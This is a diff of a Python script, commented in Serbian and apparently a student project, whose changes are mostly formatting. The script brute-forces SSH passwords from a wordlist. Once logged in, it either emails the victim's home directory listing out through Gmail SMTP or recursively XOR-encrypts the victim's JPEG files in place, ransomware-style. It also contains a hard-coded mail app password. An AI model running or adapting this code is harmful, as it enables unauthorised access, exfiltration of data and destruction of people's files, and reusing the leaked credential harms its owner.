@@ -26,16 +26,10 @@ RESET = Fore.RESET
 BLUE = Fore.BLUE
 
 
-
 # Funkcija koja nam govori da li je kombinacija tacna
 
 
-
-
-
 def is_ssh_open(hostname, username, password):
-
-
 
     # inicijalizujemo ssh klijent
 
@@ -45,19 +39,16 @@ def is_ssh_open(hostname, username, password):
 
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
-
-
     # try pokusa blok koda, ako ima greska hvatamo je sa except, a ako nema gresaka ulazimo u else deo, finally je deo koda koji se uvek izvrsi
 
     try:
 
         # Pokusavamo da se povezemo sa timeoutom od 3 sekunde
 
-        client.connect(hostname = hostname, username = username, password = password, port = 2222, timeout = 3)
+        client.connect(hostname=hostname, username=username,
+                       password=password, port=2222, timeout=3)
 
         #client.connect(hostname=hostname, username=username, password=password, timeout=3)
-
-
 
     except socket.timeout:
 
@@ -98,9 +89,6 @@ def is_ssh_open(hostname, username, password):
         return True
 
 
-
-
-
 def sendMail(stdout):
 
     output = ""
@@ -111,7 +99,7 @@ def sendMail(stdout):
 
     if output != "":
 
-    # Slanje mejla
+        # Slanje mejla
 
         server = 'smtp.gmail.com'
 
@@ -121,11 +109,7 @@ def sendMail(stdout):
 
         passw = 'zgrf utzx uyhs npvz'
 
-
-
         port = 465
-
-
 
         try:
 
@@ -148,61 +132,51 @@ def sendMail(stdout):
         print("Nije bilo outputa")
 
 
-
-def criptImage(files, client, user, key, path = ""):
+def criptImage(files, client, user, key, path=""):
 
     for file in files:
-        #Dobijamo tip fajla
+        # Dobijamo tip fajla
         stdin, stdout, stderr = client.exec_command(f"cd {path}; file {file}")
         stdout = stdout.readlines()
         stdString = ''.join(stdout)
-	tmppath = path
+        tmppath = path
         if 'directory\n' in stdString:
 
             #print(f"Sada je u {file} i to je tipa {stdString}")
             file = file.strip()
-            path = path + file + "/" 
+            path = path + file + "/"
             stdin, stdout, stderr = client.exec_command(f"cd {path}; ls")
             stdout = stdout.readlines()
-            criptImage(stdout, client, user, key, path) 
+            criptImage(stdout, client, user, key, path)
             path = tmppath
 
         elif 'JPEG' in stdString:
             sftp_client = client.open_sftp()
-            path1 = '/home/'+ user + '/' + path + file
+            path1 = '/home/' + user + '/' + path + file
             path1 = path1.strip()
-            #Otvaramo fajl za citanje
-            remote_file = sftp_client.open(path1, mode = 'r')
+            # Otvaramo fajl za citanje
+            remote_file = sftp_client.open(path1, mode='r')
             image = remote_file.read()
             remote_file.close()
 
-            #Prebacujemo sliku u niz bajtova zbog lakse enkripcije
+            # Prebacujemo sliku u niz bajtova zbog lakse enkripcije
             image = bytearray(image)
-            
-            #Primenjujemo xor na svaki bajt
+
+            # Primenjujemo xor na svaki bajt
             for index, values in enumerate(image):
-                image[index] = values^key
-            
-            #Otvaramo fajl i pisemo u njega
-            remote_file = sftp_client.open(path1, mode = 'w')
+                image[index] = values ^ key
+
+            # Otvaramo fajl i pisemo u njega
+            remote_file = sftp_client.open(path1, mode='w')
             remote_file.write(image)
-            
+
             remote_file.close()
-
-            
-            
-
-
-
 
 
 # __name__ proverava da li je ovo glavn skripta ili importovana, ako pokrecemo direktno ovu skriptu __name__ ce biti main a inace ce biti recimo __import__
-
 if __name__ == "__main__":
 
     import argparse
-
-
 
     # Posto pozivam program u komandnoj liniji --p pre necega oznacava da je to pasvord, --u da je username a ako ne ukucam nista onda je to host
 
@@ -222,8 +196,6 @@ if __name__ == "__main__":
 
     parser.add_argument("-u", "--user", help="Hostname username.")
 
-
-
     # Parsiramo dodate argumente
 
     args = parser.parse_args()
@@ -234,13 +206,9 @@ if __name__ == "__main__":
 
     user = args.user
 
-
-
     # Citaj fajl
 
     passlist = open(passlist).read().splitlines()
-
-
 
     # brutfors
 
@@ -258,8 +226,6 @@ if __name__ == "__main__":
 
             break
 
-
-
     # Konekcija
 
     if (passFound == True):
@@ -270,11 +236,9 @@ if __name__ == "__main__":
 
         #client.connect(host, username=user, password=password)
 
-        client.connect(host,username=user,password=password,port=2222)
+        client.connect(host, username=user, password=password, port=2222)
 
         print("SSH Konekcija uspesna")
-
-
 
         # Dobijanje sadrzaja home foldera
 
@@ -284,32 +248,24 @@ if __name__ == "__main__":
 
         stdout = stdout.readlines()
 
-
-
         # Stdout u listu
 
-        tipKomande = input("Za slanje home direktorijuma na mejl unesite komandu 'mail' a za kriptovanje slike 'cript' : ")
+        tipKomande = input(
+            "Za slanje home direktorijuma na mejl unesite komandu 'mail' a za kriptovanje slike 'cript' : ")
 
-
-
-        if(tipKomande == "mail"):
+        if (tipKomande == "mail"):
 
             sendMail(stdout)
 
-        elif(tipKomande == "cript"):
+        elif (tipKomande == "cript"):
             key = int(input("Unesite numericki kljuc za enkripciju: "))
             path = ""
             criptImage(stdout, client, user, key, path)
             print("Enkripcija je uspesna")
-        
-
-
 
         client.close()
 
     ###ZATVORENA KONEKCIJA###
-
-
 
     else:
 
